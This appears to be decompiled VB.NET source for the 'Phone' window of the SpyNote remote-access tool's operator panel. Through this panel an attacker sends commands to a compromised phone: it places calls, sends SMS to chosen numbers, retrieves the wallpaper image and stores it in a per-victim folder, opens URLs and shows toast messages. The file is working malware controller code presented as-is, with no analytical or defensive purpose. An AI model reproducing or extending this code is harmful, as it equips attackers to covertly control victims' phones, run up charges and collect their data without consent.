Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports etonyps.My
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Phone
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Private int As Integer
    Public Sub New()
        Me.int = 0
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = Operators.CompareString(data, "opWind", False) <> 0
                If flag2 Then
                    Dim flag3 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                    If flag3 Then
                        Dim separator As String() = New String() {"[My/Exception]"}
                        Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                        Me.Label3.Text = array(0)
                        Dim flag4 As Boolean = Not Me.Panel3.Visible
                        If flag4 Then
                            Me.Panel3.Visible = True
                        End If
                    Else
                        Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Ary}
                        Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                        Dim left As String = array2(0)
                        If Operators.CompareString(left, "phone_call", False) <> 0 Then
                            If Operators.CompareString(left, "phone_send", False) <> 0 Then
                                If Operators.CompareString(left, "uri_send", False) <> 0 Then
                                    If Operators.CompareString(left, "toast_text", False) <> 0 Then
                                        If Operators.CompareString(left, "wallpaper", False) = 0 Then
                                            Dim buffer As Byte() = Convert.FromBase64String(array2(1))
                                            Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                                            Dim bitmap As Bitmap = New Bitmap(Image.FromStream(memoryStream))
                                            Me.PictureBox1.Image = bitmap
                                            memoryStream.Dispose()
                                            Dim text As String = String.Concat(New String() {Application.StartupPath, "\", store_0.name_folder_app_resource, "\Folder_Clients\", Me.Name_Client, Me.Client_ID, "\wallpaper"})
                                            Dim flag5 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
                                            If flag5 Then
                                                My.Computer.FileSystem.CreateDirectory(text)
                                            End If
                                            Dim arg As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                                            Dim str As String = String.Format("{0:1}", arg, Nothing)
                                            bitmap.Save(text + "\" + str + ".Jpeg", ImageFormat.Jpeg)
                                        End If
                                    Else
                                        Me.Label2.Text = array2(1)
                                    End If
                                Else
                                    Me.Label2.Text = array2(1)
                                End If
                            Else
                                Me.Label2.Text = array2(1)
                            End If
                        Else
                            Me.Label2.Text = array2(1)
                        End If
                        Dim visible As Boolean = Me.Panel3.Visible
                        If visible Then
                            Me.Panel3.Visible = False
                        End If
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Phone_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Me.RichTextBox2.ContextMenuStrip = store_0.ContextMenu1
        Me.ErrorProvider1.Icon = store_0.icons_0("errors")
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
        Me.TabPage1.Text = "Contact phone numbers"
        Me.TabPage2.Text = "Send SMS"
        Me.TabPage3.Text = "Wallpaper"
        Me.TabPage4.Text = "URI"
        Me.TabPage5.Text = "Toast"
        Me.TabPage1.[Select]()
        Me.DataGridView1.Rows.Add(New Object() {"1", "2", "3"})
        Me.DataGridView1.Rows.Add(New Object() {"4", "5", "6"})
        Me.DataGridView1.Rows.Add(New Object() {"7", "8", "9"})
        Me.DataGridView1.Rows.Add(New Object() {"*", "0", "#"})
    End Sub

    Private Sub TabPage1_Enter(sender As Object, e As EventArgs) Handles TabPage1.Enter
        Me.int = 1
        Me.Button1.Text = "Call"
        Me.Panel1.Enabled = True
    End Sub

    Private Sub TabPage2_Enter(sender As Object, e As EventArgs) Handles TabPage2.Enter
        Me.int = 2
        Me.Button1.Text = "Send"
        Me.Panel1.Enabled = True
    End Sub

    Private Sub TabPage3_Enter(sender As Object, e As EventArgs) Handles TabPage3.Enter
        Me.int = 3
        Me.Button1.Text = "Get"
        Me.Panel1.Enabled = False
    End Sub

    Private Sub TabPage4_Enter(sender As Object, e As EventArgs) Handles TabPage4.Enter
        Me.int = 4
        Me.Button1.Text = "Open"
        Me.Panel1.Enabled = False
    End Sub

    Private Sub TabPage5_Enter(sender As Object, e As EventArgs) Handles TabPage5.Enter
        Me.int = 5
        Me.Button1.Text = "Show"
        Me.Panel1.Enabled = False
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Phone - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text
    End Sub

    Public Function Parse_0(strValue As String) As String
        Dim text As String = Nothing
        For Each value As Char In strValue.ToCharArray()
            Dim text2 As String = Conversions.ToString(value).Trim()
            Dim flag As Boolean = Operators.CompareString(text2, "#", False) = 0 Or Operators.CompareString(text2, "*", False) = 0 Or Operators.CompareString(text2, "+", False) = 0 Or Versioned.IsNumeric(text2)
            If flag Then
                text += text2
            End If
        Next
        Return text
    End Function

    Private Sub DataGridView1_CellContentClick_1(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick
        Dim textBox As TextBox = Me.TextBox1
        Dim textBox2 As TextBox = textBox
        textBox.Text = textBox2.Text + Me.DataGridView1.CurrentCell.Value.ToString()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim flag As Boolean = Me.TextBox1.Text.Length <> 0
        If flag Then
            Me.TextBox1.Text = Me.TextBox1.Text.Remove(Me.TextBox1.Text.Length - 1)
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim text As String = Me.Parse_0(Me.TextBox1.Text)
        Me.TextBox1.Text = text
        Select Case Me.int
            Case 1
                Dim flag As Boolean = Operators.CompareString(text, Nothing, False) <> 0
                If flag Then
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, "phone_call" + My.Forms.Form1.s.SplitData + text)
                    Me.ErrorProvider1.SetError(Me.TextBox1, Nothing)
                Else
                    Me.ErrorProvider1.SetError(Me.TextBox1, "Cannot be Empty")
                End If
            Case 2
                Dim flag2 As Boolean = Operators.CompareString(text, Nothing, False) <> 0
                If flag2 Then
                    Dim text2 As String = Me.RichTextBox1.Text
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"phone_send", My.Forms.Form1.s.SplitData, text, My.Forms.Form1.s.SplitData, text2}))
                    Me.ErrorProvider1.SetError(Me.TextBox1, Nothing)
                Else
                    Me.ErrorProvider1.SetError(Me.TextBox1, "Cannot be Empty")
                End If
            Case 3
                Dim flag3 As Boolean = Me.PictureBox1.Image IsNot Nothing
                If flag3 Then
                    Me.PictureBox1.Image = Nothing
                End If
                My.Forms.Form1.s.Send(Me.handle_Number_Client, "get_wallpaper" + My.Forms.Form1.s.SplitData)
            Case 4
                Dim flag4 As Boolean = Operators.CompareString(Me.TextBox2.Text, Nothing, False) <> 0
                If flag4 Then
                    Dim flag5 As Boolean = Me.TextBox2.Text.Contains("http:") Or Me.TextBox2.Text.Contains("https:")
                    If flag5 Then
                        My.Forms.Form1.s.Send(Me.handle_Number_Client, "set_uri" + My.Forms.Form1.s.SplitData + Me.TextBox2.Text)
                        Me.ErrorProvider1.SetError(Me.TextBox2, Nothing)
                    Else
                        Me.ErrorProvider1.SetError(Me.TextBox2, "missing 'http:' ? 'https:'")
                    End If
                Else
                    Me.ErrorProvider1.SetError(Me.TextBox2, "Cannot be Empty")
                End If
            Case 5
                My.Forms.Form1.s.Send(Me.handle_Number_Client, "toast_text" + My.Forms.Form1.s.SplitData + Me.RichTextBox2.Text)
        End Select
    End Sub

    Private Sub Phone_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.ErrorProvider1.Clear()
    End Sub

End Class